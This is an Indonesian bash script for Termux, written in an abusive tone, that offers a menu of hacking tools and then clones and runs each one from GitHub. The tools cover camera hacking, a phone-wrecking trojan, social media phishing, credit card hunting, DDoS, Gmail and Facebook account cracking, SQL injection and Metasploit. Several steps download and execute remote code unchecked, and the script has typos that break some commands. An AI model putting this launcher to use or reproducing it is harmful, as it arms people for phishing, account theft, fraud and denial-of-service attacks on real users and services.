#!/system/xbin/bash
#AUTHOR:MR CROOT
#Github:https://github.com/reyspeed
#Ngapain Lo Sampai Sini Mau Recode! Gua Doain Orang Tua Lu Meninggal Dan Lu mandul Sampai Mati.boleh Recode Tapi Hargai Author Njeng
blue='\e[1;34m'
green='\e[1;32m'
purple='\[1;35m'
cyan='\e[1;36m'
red='\e[1;31m'
white='\e[1;37m'
yellow='\e[1;33m'
sleep 3
echo "\033[34;1m
__________________________________
  ║▒▒▒▒▒▒▒▒▒▒║  |By:MR.CROOT   |
  ║▒▒▒▒▒▒▒▒▒▒║  |Gray Hat      |
  ║▒▒▒▒▒▒▒▒▒▒║  |Tersakiti     |
  ║▒▒▒▒▒▒▒▒▒▒║  |______________|
  ║▒▒▒▒▒▒▒▒▒▒║
  ║▒▒▒▒▒▒▒▒▒▒║
 ╔════════════╗
 ╚════════════╝
  ║██████████╚╗
  ║██╔══╗█╔═╗█║
  ║██║╬╔╝█╚╗║█║
  ║██╚═╝█║█╚╝█║
  ╚╗█████████═╝
   ╚╗║╠╩╩╩╩╩╝
    ║║┈┈┈█▐█████▒.｡oO
    ║██╠╦╦╦╗
    ╚╗██████
     ╚════╝
"
sleep 3
echo "\033[32;1m
<==××*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*××==>"
ulang='y'
while [ $ulang = 'y' ];
do
  echo '1).Hack Camera'
  echo '2).Pelacak-Maling'
  echo '3).Pencari-Ip'
  echo '4).Perusak-Hp'
  echo '5).Phishing Medsos'
  echo '6).Mining Bitcoin(indo)'
  echo '7).Bug Hunter'
  echo '8).Dark-Fb'
  echo '9).Cari CC'
  echo '10).DDOS Attack'
  echo '11).Install Metasploit'
  echo '12).Install Linuk'
  echo '13).Hack-Gmail'
  echo '14).Admin-Finder'
  echl '15).Sql Injetion'
  echo '0) exit '
echo "
<==××*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*××==>"  
  read -p 'Pilih Mana Bangsat : ' pil; 
 
  if [ $pil = '1' ]
  then
      echo 'Sabar Njeng'
      cd $HOME
      apt update && apt upgrade -y
      apt install php -y
      apt install bash -y
      apt install git -
      apt install openssh -y
      termux-setup-storage
      cd /sdcard
      mkdir hackcam
      cd hackcam
      git clone https://github.com/reyspeed/hack-camera
      cd hack-camera
      bash camera.sh
      echo 'Sukses Njeng....! '
      sleep 1
 
  elif [ $pil = '2' ];
  then
      echo 'Sabar Njeng '
      cd $HOME
      apt update  && apt upgrade -y
      apt install python2 -y
      apt install python -y
      apt install git -y
      git clone https://github.com/reyspeed/pelacak-maling
      cd pelacak-maling
      bash locator.sh
      echo 'Sukses Njeng...! '
      sleep 1
  
  elif [ $pil = '3' ];
  then
      echo 'Sabar Njeng'
      cd $HOME
      apt update && apt upgrade -y
      apt install git
      apt install figlet
      git clone https://github.com/reyspeed/pencari-ip
      cd pencari-ip
      python2 crips.py
      echo 'Sukses Njeng... '
      sleep 1
  elif [ $pil = '4' ];
  then
      echo 'Sabar Njeng'
      cd $HOME
      apt update && apt upgrade -y
      apt install python2
      apt install git
      pip2 install mechanize
      pip2 install requests
      git clone https://github.com/reyspeed/perusak
      cd perusak
      python2 trojans.py
      
     elif [ $pil = '5' ];
  then
      
      pkg update && apt upgrade
      pkg install git
      pkg install php
      pkg install curl
      pkg install wget
      pkg install openssh
      git clone https://github.com/thelinuxchoice/shellphish
      ls
      cd shellphish
      bash shellphish.sh
      
    elif [ $pil = '6' ];
  then
      apt update && apt upgrade
      apt install git
      apt install php
      apt install figlet
      git clone https://github.com/reyspeed/BTC
      cd BTC
      sh BTC.sh
      
     elif [ $pil = '7' ];
  then
    pkg install python2
    pkg install git
    git clone https://github.com/reyspeed/bughunter
    cd bughunter
    python2 scan.py
    
    elif [ $pil = '8' ];
  then

    ppt update && pkg upgrade -y
    pkg install git
    pkg install python2
    git clone https://github.com/reyspeed/dark-fb
    pip2 install requests
    pip2 install mechanize
    cd dark-fb
    python2 dark-fb.py
     
    elif [ $pil = '9' ];
  then
  pkg update && pkg upgrade
  pkg install python2
  pkg install sl
  pkg install figlet
  pkg install git
  git clone https://github.com/reyspeed/kartu-kredit
  cd kartu-kredit
  bash Card.sh
  
 elif [ $pil = '10' ];
  then
  
  pkg update && pkg upgrade  
  pkg install git  
  pkg install python2  
  pkg install figlet  
  git clone https://github.com/reyspeed/REY-DDOS  
  cd REY-DDOS  
  python2 DDOS.py
  
   elif [ $pil = '11' ];
    then
  pkg install git
  git clone https://github.com/Hax4us/Metasploit_termux
  cd Metasploit_termux
  chmod +x metasploit.sh
  ./metasploit.sh
  
   elif [ $pil = '12' ];
    then
    
pkg install wget openssl-tool proot -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Kali/kali.sh && bash kali.sh

   elif [ $pil = '13' ];
    then
pkg upgrade && apt update
pkg install python2
pkg install git
pkg install php
git clone https://github.com/reyspeed/hack-gmail
cd hack-gmail
python2 gmail-hack.py

   elif [ $pil = '14' ];
    then
    

  pkg install php
  pip install figlet
  pkg install python2
  pkg install git
  git clone https://github.com/reyspeed/admin-finder
  cd admin-finder
  php admin.php
  
   elif [ $pil = '15' ];
    then
  
  
   apt update && apt upgrade -y
   apt install git
   apt install python2
   git clone https://github.com/sqlmapproject/sqlmap
   cd sqlmap
   python2 sqlmap.py
  
  
    elif [ $pil = '0' ];
  then
      echo 'Bye Bye Njeng Salam Dari Gua MR.CROOT Tersakiti'
      sleep 2
      exit
  #kodisi else
  else
      echo 'Gak Ada Njeng....! '
      sleep 1
      echo $ulang
  fi
done
       